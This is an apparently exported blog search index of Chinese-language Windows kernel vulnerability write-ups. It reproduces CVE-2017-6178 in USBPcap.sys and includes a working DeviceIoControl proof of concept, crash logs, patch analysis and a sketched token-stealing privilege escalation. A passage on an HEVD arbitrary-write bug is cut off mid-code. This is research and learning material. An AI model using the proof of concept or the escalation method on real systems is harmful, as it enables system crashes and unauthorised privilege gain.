<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CVE-2017-6178 漏洞复现</title>
    <link href="/2022/07/26/CVE-2017-6178%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/07/26/CVE-2017-6178%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>复现<code>CVE-2017-6178</code>时，还是踩了很多坑的</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><pre><code class="hljs nsis">虚拟机：<span class="hljs-literal">Win7</span> SP1 x86物理机：<span class="hljs-literal">Win10</span>debugger：windbg previewcompiler：vs2022</code></pre><p>主要为了获取<code>x86</code>的<code>USBPcap.sys</code>花费了很多时间，首先根据<code>CVE-2017-6178</code>的漏洞描述以及<code>exploit-db</code>的说明，可知其实可以通过安装<a href="https://2.na.dl.wireshark.org/win32/all-versions/Wireshark-win32-2.2.5.exe">Wireshark-win32-2.2.5.exe</a>得到<code>USBPcap.sys</code></p><p>但是我最初的时候，通过<code>Win7 SP x64</code>安装，但是这样得到的是<code>x64</code>的<code>USBPcap.sys</code>（我不确定是否存在洞，最后分析完了之后看<code>x64</code>版本是有的，其实<code>github</code>上<code>1.0.0.7</code>里面也有洞，可是当时我没翻到这个文件🙃），于是我把<code>x64</code>上得到的<code>USBPcapSetup-1.1.0.0-g794bf26-5.exe</code>放到<code>win7 x86</code>上进行安装，最后得到了<code>x86</code>的<code>USBPcap.sys</code>（直接拿32位的<code>wireshark-2.2.5.exe</code>安装也应该可以）</p><p>这个时候就报出，需要将<code>win7</code>更新到安装了<code>KB3033929</code>的版本，但是我已经安装了，最后在<code>USBPcap</code>的<code>github</code>仓库的<a href="https://github.com/desowin/usbpcap/issues/31">issue</a>，找到了一个伪装自己已经安装了<code>KB3033929</code>的方法</p><p>通过创建一个内容为<code>@echo KB3033929</code>的<code>findstr.cmd</code>文件，放入<code>c:\windows\system32</code>目录，并将其目录下的<code>findstr.exe</code>修改名字，从而实现查询时，返回已安装的结果</p><p>注：这个地方，需要重命名<code>findstr.exe</code>的时候需要修改<code>findstr.exe</code>文件的<code>own</code>和赋予<code>admin</code>权限，参考<a href="https://blog.csdn.net/zy_strive_2012/article/details/79470829">这篇博客</a></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这个漏洞其实比较简单，就是在设置<code>dispatchHandler</code>时，对于<code>IRP_MJ_FILE_SYSTEM_CONTROL 0x0d</code>，这个<code>handler</code>中处理出错（注：<code>sub_1145A</code>即<code>IRP_MJ_FILE_SYSTEM_CONTROL</code>的<code>handler</code>）</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __stdcall <span class="hljs-title">sub_1145A</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1, PVOID Tag)</span></span><span class="hljs-function"></span>&#123;  _DEVICE_OBJECT *v2; <span class="hljs-comment">// edi</span>  <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// eax</span>  _DEVICE_OBJECT *DriverObject; <span class="hljs-comment">// ecx</span>  NTSTATUS v6; <span class="hljs-comment">// edi</span>  _DEVICE_OBJECT **p_AttachedDevice; <span class="hljs-comment">// [esp-Ch] [ebp-18h]</span>  <span class="hljs-keyword">int</span> v8; <span class="hljs-comment">// [esp+14h] [ebp+8h]</span>  v2 = *(_DEVICE_OBJECT **)(a1 + <span class="hljs-number">40</span>);  v3 = IoAcquireRemoveLockEx((PIO_REMOVE_LOCK)&amp;v2-&gt;AttachedDevice, Tag, &amp;File, <span class="hljs-number">1u</span>, <span class="hljs-number">0x18</span>u);  v8 = v3;  <span class="hljs-keyword">if</span> ( v3 &gt;= <span class="hljs-number">0</span> )  &#123;    DriverObject = (_DEVICE_OBJECT *)v2-&gt;DriverObject;    ++*((_BYTE *)Tag + <span class="hljs-number">35</span>);    *((_DWORD *)Tag + <span class="hljs-number">24</span>) += <span class="hljs-number">36</span>;    p_AttachedDevice = &amp;v2-&gt;AttachedDevice;    v6 = IofCallDriver(DriverObject, (PIRP)Tag);<span class="hljs-comment">// vuln</span>    IoReleaseRemoveLockEx((PIO_REMOVE_LOCK)p_AttachedDevice, Tag, <span class="hljs-number">0x18</span>u);    <span class="hljs-keyword">return</span> v6;  &#125;  <span class="hljs-keyword">else</span>  &#123;    sub_11434((PIRP)Tag, v3, <span class="hljs-number">0</span>);    <span class="hljs-keyword">return</span> v8;  &#125;&#125;</code></pre><p>这个地方并未判断<code>DriverObject</code>是否为<code>NULL</code>，而导致这个未初始化的值直接传入了<code>IofCallDriver</code>，从而出现了空指针解引用的错误</p><p>最终<code>crash</code>位置</p><pre><code class="hljs routeros">Access violation - code c0000005 (!!! second chance !!!)<span class="hljs-attribute">eax</span>=87b91268 <span class="hljs-attribute">ebx</span>=86ff89f0 <span class="hljs-attribute">ecx</span>=0000000d <span class="hljs-attribute">edx</span>=87b911f8 <span class="hljs-attribute">esi</span>=00000000 <span class="hljs-attribute">edi</span>=86ff89e0<span class="hljs-attribute">eip</span>=83e57f7b <span class="hljs-attribute">esp</span>=8a987ac0 <span class="hljs-attribute">ebp</span>=8a987ac8 <span class="hljs-attribute">iopl</span>=0         nv up ei ng nz na po cy<span class="hljs-attribute">cs</span>=0008  <span class="hljs-attribute">ss</span>=0010  <span class="hljs-attribute">ds</span>=0023  <span class="hljs-attribute">es</span>=0023  <span class="hljs-attribute">fs</span>=0030  <span class="hljs-attribute">gs</span>=0000             <span class="hljs-attribute">efl</span>=00010383nt!IofCallDriver+0x57:83e57f7b 8b4608          mov     eax,dword ptr [esi+8] ds:0023:<span class="hljs-attribute">00000008</span>=????????</code></pre><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>因为是<code>IRP_MJ_FILE_SYSTEM_CONTROL</code>，所以要用<code>FILE_DEVICE_FILE_SYSTEM</code>的<code>IOCTL</code>才可以</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FILE_DEVICE_FILE_SYSTEM         0x00000009</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FILE_DEVICE_UNKNOWN             0x00000022</span></code></pre><p>最终<code>POC</code>是直接用的<a href="https://github.com/k0keoyo/try_exploit/blob/master/_cve_2017_6178_poc/_CVE_2017_6178_PoC.cpp"> k0keoyo师傅的POC </a></p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><span class="hljs-function"></span>&#123;    HANDLE hDevice;    DWORD dwRetBytes = <span class="hljs-number">0</span>;    hDevice = CreateFile(<span class="hljs-string">&quot;\\\\.\\USBPcap1&quot;</span>, <span class="hljs-number">0</span>, FILE_SHARE_READ | FILE_SHARE_WRITE, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);    <span class="hljs-keyword">if</span> (hDevice == INVALID_HANDLE_VALUE)    &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] CreateFile failed (%.08x)\n&quot;</span>, GetLastError());        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    bResult = DeviceIoControl(hDevice, <span class="hljs-number">0x00090000</span>,(LPVOID)<span class="hljs-number">0x1</span>, (DWORD)<span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;dwRetBytes, <span class="hljs-literal">NULL</span>);    <span class="hljs-keyword">if</span> (!bResult)    &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] DeviceIOControl failed (%.08x)\n&quot;</span>,GetLastError());        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    &#125;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] if show this info ,PoC is failed:(\n\n&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><h2 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h2><p>修复这个漏洞也很简单，就是判断一下这个<code>DriverObject</code>是不是初始化的<code>NULL</code></p><pre><code class="hljs c"><span class="hljs-function">NTSTATUS __stdcall <span class="hljs-title">sub_402038</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1, PVOID Tag)</span></span><span class="hljs-function"></span>&#123;  _DEVICE_OBJECT *v2; <span class="hljs-comment">// ebx</span>  <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// eax</span>  NTSTATUS v4; <span class="hljs-comment">// edi</span>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">DEVICE_OBJECT</span> *<span class="hljs-title">DriverObject</span>;</span> <span class="hljs-comment">// ecx</span>  v2 = *(_DEVICE_OBJECT **)(a1 + <span class="hljs-number">40</span>);  v3 = IoAcquireRemoveLockEx((PIO_REMOVE_LOCK)&amp;v2-&gt;AttachedDevice, Tag, &amp;File, <span class="hljs-number">1u</span>, <span class="hljs-number">0x18</span>u);  v4 = v3;  <span class="hljs-keyword">if</span> ( v3 &gt;= <span class="hljs-number">0</span> )  &#123;    DriverObject = (struct _DEVICE_OBJECT *)v2-&gt;DriverObject;    <span class="hljs-keyword">if</span> ( DriverObject )    &#123;      ++*((_BYTE *)Tag + <span class="hljs-number">35</span>);      *((_DWORD *)Tag + <span class="hljs-number">24</span>) += <span class="hljs-number">36</span>;      v4 = IofCallDriver(DriverObject, (PIRP)Tag);    &#125;    <span class="hljs-keyword">else</span>    &#123;      v4 = <span class="hljs-number">-1073741808</span>;      sub_40201A((PIRP)Tag, <span class="hljs-number">-1073741808</span>, <span class="hljs-number">0</span>);    &#125;    IoReleaseRemoveLockEx((PIO_REMOVE_LOCK)&amp;v2-&gt;AttachedDevice, Tag, <span class="hljs-number">0x18</span>u);  &#125;  <span class="hljs-keyword">else</span>  &#123;    sub_40201A((PIRP)Tag, v3, <span class="hljs-number">0</span>);  &#125;  <span class="hljs-keyword">return</span> v4;&#125;</code></pre><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>调试这边踩坑特别多，最初对<code>DeviceIoControl</code>的流程不理解的时候，下断点的时候，一直参照其他的调试驱动出错时的<code>nt!NtDeviceIoControlFile</code>函数中下断点</p><p>最初是以为是，自己的条件断点不熟练，以及<code>offset=0</code>时，这个<code>ebp</code>还不是后续的<code>ebp</code>所以出错</p><pre><code class="hljs x86asm">nt!NtDeviceIoControlFile:840a07a9 8bff            <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edi</span>,<span class="hljs-built_in">edi</span>840a07ab <span class="hljs-number">55</span>              <span class="hljs-keyword">push</span>    <span class="hljs-built_in">ebp</span>840a07ac 8bec            <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">ebp</span>,<span class="hljs-built_in">esp</span>840a07ae 6a01            <span class="hljs-keyword">push</span>    <span class="hljs-number">1</span>840a07b0 ff752c          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">2Ch</span>]840a07b3 ff7528          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">28h</span>]840a07b6 ff7524          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">24h</span>]840a07b9 ff7520          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">20h</span>]840a07bc ff751c          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">1Ch</span>]840a07bf ff7518          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">18h</span>]840a07c2 ff7514          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">14h</span>]840a07c5 ff7510          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">10h</span>]840a07c8 ff750c          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">0Ch</span>]840a07cb ff7508          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">8</span>]840a07ce e8a682fbff      <span class="hljs-keyword">call</span>    nt!IopXxxControlFile (84058a79)840a07d3 <span class="hljs-number">5d</span>              <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">ebp</span>840a07d4 c22800          <span class="hljs-keyword">ret</span>     <span class="hljs-number">28h</span></code></pre><p>后来才发现是因为，这个<code>DeviceIoControl</code>因为是<code>#define FILE_DEVICE_FILE_SYSTEM         0x00000009</code>，所以走的是另外一条路，应该是在<code>nt!NtFsControlFile</code>中下断点</p><p>最终条件断点的指令为</p><pre><code class="hljs apache"><span class="hljs-attribute">bp</span> nt!NtFsControlFile+<span class="hljs-number">0</span>x<span class="hljs-number">25</span> <span class="hljs-string">&quot;.printf\&quot;IOCTL:%p\&quot;,dwo(esp+0x14);.echo;g&quot;</span><span class="hljs-attribute">bp</span> nt!NtFsControlFile+<span class="hljs-number">0</span>x<span class="hljs-number">25</span> <span class="hljs-string">&quot;.if(dwo(esp+0x14)=0x00090000)&#123;&#125;.else&#123;gc;&#125;&quot;</span><span class="hljs-attribute">bp</span> nt!IofCallDriver+<span class="hljs-number">60</span> <span class="hljs-string">&quot;.if(ecx=0xd)&#123;&#125;.else&#123;gc;&#125;&quot;</span></code></pre><p>这个地方也可以用<code>poi</code>，关于<a href="https://stackoverflow.com/questions/37991872/how-to-reference-32bit-integer-data-in-a-64-bit-dump">dwo qwo poi的区别</a>，<a href="https://stackoverflow.com/questions/6097157/conditional-breakpoint-that-tests-multiple-stack-variables">多个条件的断点</a>，<a href="https://blogs.keysight.com/blogs/tech/nwvs.entry.html/2020/07/27/debugging_malwarewi-hk5u.html">echo</a></p><h2 id="该POC的整个流程"><a href="#该POC的整个流程" class="headerlink" title="该POC的整个流程"></a>该POC的整个流程</h2><p>为了调试弄清<code>DeviceIoControl</code>从用户态如何到了驱动的<code>dispatch Handler</code>，我在如下地方下了断点</p><pre><code class="hljs armasm"><span class="hljs-keyword">bp</span> kernel32!DeviceIoControl<span class="hljs-keyword">bp</span> kernel32!DeviceIoControlImplementation<span class="hljs-keyword">bp</span> kernelbase!DeviceIoControl</code></pre><p>发现首先会断在<code>kernel32!DeviceIoControlImplementation</code>，再是<code>kernel32!DeviceIoControl</code>，最后是<code>kernelbase!DeviceIoControl</code></p><p>因此该流程应该如下</p><p>用户态的<code>DeviceIoControl</code> </p><p>=&gt; 内核的<code>ntoskrnl.exe</code>的<code>ZwDeviceIoControl</code>函数（通过<code>call KiSystemService</code>） </p><pre><code class="hljs c"><span class="hljs-function">NTSTATUS __stdcall <span class="hljs-title">ZwDeviceIoControlFile</span><span class="hljs-params">(...)</span></span><span class="hljs-function"></span>&#123;  __readeflags();  <span class="hljs-keyword">return</span> KiSystemService(<span class="hljs-number">8</span>);&#125;</code></pre><p>=&gt; 内核<code>kernel32.dll</code>的<code>DeviceIoControlImplementation</code>（通过<code>call DeviceIoControl</code>）</p><pre><code class="hljs c"><span class="hljs-function">BOOL __stdcall <span class="hljs-title">DeviceIoControlImplementation</span><span class="hljs-params">(...)</span></span><span class="hljs-function"></span>&#123;  DWORD v8; <span class="hljs-comment">// esi</span>  NTSTATUS v10; <span class="hljs-comment">// eax</span>  v8 = dwIoControlCode;  <span class="hljs-keyword">if</span> ( dwIoControlCode != <span class="hljs-number">0x2D4808</span> &amp;&amp; dwIoControlCode != <span class="hljs-number">0x74808</span> &amp;&amp; dwIoControlCode != <span class="hljs-number">0x90020</span>    || NtCurrentTeb()-&gt;ProcessEnvironmentBlock-&gt;SessionId == MEMORY[<span class="hljs-number">0x7FFE02D8</span>] )  &#123;    <span class="hljs-keyword">return</span> DeviceIoControl(...);  &#125;  v10 = IsTSAppCompatEnabled((BOOL *)&amp;dwIoControlCode);  <span class="hljs-keyword">if</span> ( v10 &gt;= <span class="hljs-number">0</span> )  &#123;    <span class="hljs-keyword">if</span> ( dwIoControlCode &amp;&amp; !IsCallerAdminOrSystem() )    &#123;      BaseSetLastNTError(<span class="hljs-number">-1073741790</span>);      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    &#125;    <span class="hljs-keyword">return</span> DeviceIoControl(...);  &#125;  BaseSetLastNTError(v10);  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>=&gt; 内核<code>kernel32.dll</code>的<code>DeviceIoControl</code>（通过<code>plt</code>）</p><pre><code class="hljs c"><span class="hljs-comment">// attributes: thunk</span><span class="hljs-function">BOOL __stdcall <span class="hljs-title">DeviceIoControl</span><span class="hljs-params">(...)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">return</span> __imp__DeviceIoControl@<span class="hljs-number">32</span>(...);&#125;</code></pre><p>=&gt; 内核<code>kernelbase.dll</code>的<code>DeviceIoControl</code>，在该函数通过判断是否为<code>FILE_DEVICE_FILE_SYSTEM</code>而判断进<code>NtFsControlFile</code>还是<code>NtDeviceIoControlFile</code></p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FILE_DEVICE_FILE_SYSTEM         0x00000009</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FILE_DEVICE_UNKNOWN             0x00000022</span></code></pre><pre><code class="hljs c"><span class="hljs-function">BOOL __stdcall <span class="hljs-title">DeviceIoControl</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">        HANDLE hDevice,</span></span><span class="hljs-function"><span class="hljs-params">        DWORD dwIoControlCode,</span></span><span class="hljs-function"><span class="hljs-params">        LPVOID lpInBuffer,</span></span><span class="hljs-function"><span class="hljs-params">        DWORD nInBufferSize,</span></span><span class="hljs-function"><span class="hljs-params">        LPVOID lpOutBuffer,</span></span><span class="hljs-function"><span class="hljs-params">        DWORD nOutBufferSize,</span></span><span class="hljs-function"><span class="hljs-params">        LPDWORD lpBytesReturned,</span></span><span class="hljs-function"><span class="hljs-params">        LPOVERLAPPED lpOverlapped)</span></span><span class="hljs-function"></span>&#123;  HANDLE hEvent; <span class="hljs-comment">// eax</span>  <span class="hljs-keyword">int</span> v9; <span class="hljs-comment">// eax</span>  <span class="hljs-keyword">int</span> Status; <span class="hljs-comment">// eax</span>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_STATUS_BLOCK</span> <span class="hljs-title">IoStatusBlock</span>;</span> <span class="hljs-comment">// [esp+10h] [ebp-20h] BYREF</span>  CPPEH_RECORD ms_exc; <span class="hljs-comment">// [esp+18h] [ebp-18h]</span>  <span class="hljs-keyword">if</span> ( !lpOverlapped )  &#123;    <span class="hljs-keyword">if</span> ( (dwIoControlCode &amp; <span class="hljs-number">0xFFFF0000</span>) == <span class="hljs-number">0x90000</span> )      Status = NtFsControlFile(                 hDevice,                 <span class="hljs-number">0</span>,                 <span class="hljs-number">0</span>,                 <span class="hljs-number">0</span>,                 &amp;IoStatusBlock,                 dwIoControlCode,                 lpInBuffer,                 nInBufferSize,                 lpOutBuffer,                 nOutBufferSize);    <span class="hljs-keyword">else</span>      Status = NtDeviceIoControlFile(                 hDevice,                 <span class="hljs-number">0</span>,                 <span class="hljs-number">0</span>,                 <span class="hljs-number">0</span>,                 &amp;IoStatusBlock,                 dwIoControlCode,                 lpInBuffer,                 nInBufferSize,                 lpOutBuffer,                 nOutBufferSize);    <span class="hljs-keyword">if</span> ( Status == <span class="hljs-number">0x103</span> )    &#123;      Status = NtWaitForSingleObject(hDevice, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);      <span class="hljs-keyword">if</span> ( Status &lt; <span class="hljs-number">0</span> )      &#123;LABEL_15:        <span class="hljs-keyword">if</span> ( (Status &amp; <span class="hljs-number">0xC0000000</span>) != <span class="hljs-number">-1073741824</span> )          *lpBytesReturned = IoStatusBlock.Information;        BaseSetLastNTError(Status);        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;      &#125;      Status = IoStatusBlock.Status;    &#125;    <span class="hljs-keyword">if</span> ( Status &gt;= <span class="hljs-number">0</span> )    &#123;      *lpBytesReturned = IoStatusBlock.Information;      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    &#125;    <span class="hljs-keyword">goto</span> LABEL_15;  &#125;  ....  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>如果是<code>NtDeviceIoControlFile</code>的话</p><pre><code class="hljs excel">=&gt; 内核 ntdll.dll 的 ZwDeviceIoControlFile（<span class="hljs-built_in">call</span> KiFastSystemCall）=&gt; 内核 ntoskrnl.exe 的 NtDeviceIoControlFile =&gt; 内核 ntoskrnl.exe 的 IopXxxControlFile</code></pre><p>如果是<code>NtFsControlFile</code>的话</p><pre><code class="hljs excel">=&gt; 内核 ntdll.dll 的 ZwFsControlFile（<span class="hljs-built_in">call</span> KiFastSystemCall）=&gt; 内核 ntoskrnl.exe 的 NtFsControlFile=&gt; 内核 ntoskrnl.exe 的 IopXxxControlFile</code></pre><p><code>IopXxxControlFile</code>函数会对<code>IRP</code>进行封装和分发，在<code>IopXxxControlFile</code>函数中会调用<code>IopSynchronousServiceTail</code>，在<code>IopSynchronousServiceTail</code>中会调用<code>IofCallDriver</code></p><p>在<code>IofCallDriver</code>中，对于不同的<code>v5</code>调用之前驱动中设置好的<code>dispatch Handler</code></p><pre><code class="hljs c"><span class="hljs-function">NTSTATUS __fastcall <span class="hljs-title">IofCallDriver</span><span class="hljs-params">(PDEVICE_OBJECT DeviceObject, PIRP Irp)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// eax</span>  <span class="hljs-keyword">unsigned</span> __int8 v5; <span class="hljs-comment">// cl</span>  <span class="hljs-keyword">char</span> v6; <span class="hljs-comment">// al</span>  <span class="hljs-keyword">void</span> *retaddr; <span class="hljs-comment">// [esp+Ch] [ebp+4h]</span>  <span class="hljs-keyword">if</span> ( pIofCallDriver )    <span class="hljs-keyword">return</span> pIofCallDriver(DeviceObject, Irp, retaddr);  <span class="hljs-keyword">if</span> ( --Irp-&gt;CurrentLocation &lt;= <span class="hljs-number">0</span> )    KeBugCheckEx(<span class="hljs-number">0x35</span>u, (ULONG_PTR)Irp, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);  v4 = Irp-&gt;Tail.Overlay.PacketType - <span class="hljs-number">36</span>;  Irp-&gt;Tail.Overlay.PacketType = v4;  v5 = *(_BYTE *)v4;  *(_DWORD *)(v4 + <span class="hljs-number">20</span>) = DeviceObject;  <span class="hljs-keyword">if</span> ( v5 == <span class="hljs-number">22</span> &amp;&amp; ((v6 = *(_BYTE *)(v4 + <span class="hljs-number">1</span>), v6 == <span class="hljs-number">2</span>) || v6 == <span class="hljs-number">3</span>) )    <span class="hljs-keyword">return</span> IopPoHandleIrp();  <span class="hljs-keyword">else</span>    <span class="hljs-keyword">return</span> DeviceObject-&gt;DriverObject-&gt;MajorFunction[v5](DeviceObject, Irp);&#125;</code></pre><p>其汇编为<code>call    dword ptr [eax+ecx*4+38h] : ecx = 0xd</code>，而<code>0xd</code>正是<code>IRP_MJ_FILE_SYSTEM_CONTROL</code></p><p>因此对于当前这个<code>POC</code>，其整个<code>DeviceIoControl</code>的流程为</p><pre><code class="hljs erlang-repl">UserMode!DeviceIoControl -&gt; ntoskrnl!ZwDeviceIoControl -&gt; kernel32!DeviceIoControlImplementation -&gt; kernel32!DeviceIoControl -&gt; kernelbase!DeviceIoControl -&gt; ntdll!ZwFsControlFile -&gt; ntoskrnl!NtDeviceIoControlFile -&gt; ntoskrnl!IopXxxControlFile -&gt; ntoskrnl!IopSynchronousServiceTail -&gt; ntoskrnl!IofCallDriver -&gt; USBPcap!IRP_MJ_FILE_SYSTEM_CONTROL_dispatch_handler</code></pre><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>最后这个<code>crash</code>位置是<code>83e57f7b 8b4608          mov     eax,dword ptr [esi+8]</code><br>而此时，<code>esi=0x0</code>，这个内存不存在，因此出错，而<code>win7</code>还可以对<code>0</code>地址进行分配内存，因此可以直接在<code>0</code>地方分配内存，则最后会<code>call [eax+ecx*4+38h]</code>，而此时，<code>ecx=0xd</code>，因此相当于<code>call [0x6c]</code></p><pre><code class="hljs x86asm">nt!IofCallDriver+<span class="hljs-number">0x57</span>:83e74f7b 8b4608          <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">esi</span>+<span class="hljs-number">8</span>]83e74f7e <span class="hljs-number">52</span>              <span class="hljs-keyword">push</span>    <span class="hljs-built_in">edx</span>83e74f7f 0fb6c9          <span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">cl</span>83e74f82 <span class="hljs-number">56</span>              <span class="hljs-keyword">push</span>    <span class="hljs-built_in">esi</span>83e74f83 ff548838        <span class="hljs-keyword">call</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">eax</span>+<span class="hljs-built_in">ecx</span>*<span class="hljs-number">4</span>+<span class="hljs-number">38h</span>]</code></pre><p>按照之前的<code>HEVD</code>写个<code>shellcode</code>，<code>steal token</code>就可以提权，最后注意能使流程正常返回即可</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>其实漏洞比较简单，就是在整个过程的环境搭建和调试磨了很长时间，然后熟悉了一下<code>DeviceIoControl</code>的整个调用链</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://www.anquanke.com/post/id/86203">https://www.anquanke.com/post/id/86203</a><br><a href="https://www.exploit-db.com/exploits/41542">https://www.exploit-db.com/exploits/41542</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HEVD win7 x64 arbitrary write</title>
    <link href="/2022/06/29/HEVD%20win7%20x64%20arbitrary%20write/"/>
    <url>/2022/06/29/HEVD%20win7%20x64%20arbitrary%20write/</url>
    
    <content type="html"><![CDATA[<p>HEVD 中的任意地址写</p><pre><code class="hljs nsis">环境：虚拟机：<span class="hljs-literal">Win7</span> SP1 x64物理机：<span class="hljs-literal">Win10</span>debugger：windbg previewcompiler：vs2022</code></pre><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>见前一篇栈溢出</p><h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p>其中<code>arbitrary write</code>为<code>0x22200b</code></p><pre><code class="hljs cpp"><span class="hljs-keyword">case</span> <span class="hljs-number">0x22200B</span>:    DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;****** HEVD_IOCTL_ARBITRARY_WRITE ******\n&quot;</span>);    FakeObjectNonPagedPoolNxIoctlHandler = ArbitraryWriteIoctlHandler(Irp, CurrentStackLocation);    v7 = <span class="hljs-string">&quot;****** HEVD_IOCTL_ARBITRARY_WRITE ******\n&quot;</span>;    <span class="hljs-keyword">goto</span> LABEL_62;</code></pre><p>漏洞点十分简单，就是一个任意地址写的漏洞</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> __fastcall <span class="hljs-title">ArbitraryWriteIoctlHandler</span><span class="hljs-params">(_IRP *Irp, _IO_STACK_LOCATION *IrpSp)</span></span><span class="hljs-function"></span>&#123;  _NAMED_PIPE_CREATE_PARAMETERS *Parameters; <span class="hljs-comment">// rcx</span>  <span class="hljs-keyword">int</span> result; <span class="hljs-comment">// eax</span>  Parameters = IrpSp-&gt;Parameters.CreatePipe.Parameters;  result = <span class="hljs-number">0xC0000001</span>;  <span class="hljs-keyword">if</span> ( Parameters )    <span class="hljs-keyword">return</span> TriggerArbitraryWrite((_WRITE_WHAT_WHERE *)Parameters);  <span class="hljs-keyword">return</span> result;&#125;</code></pre><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">TriggerArbitraryWrite</span><span class="hljs-params">(_WRITE_WHAT_WHERE *UserWriteWhatWhere)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">unsigned</span> __int64 *What; <span class="hljs-comment">// rbx</span>  <span class="hljs-keyword">unsigned</span> __int64 *Where; <span class="hljs-comment">// rdi</span>  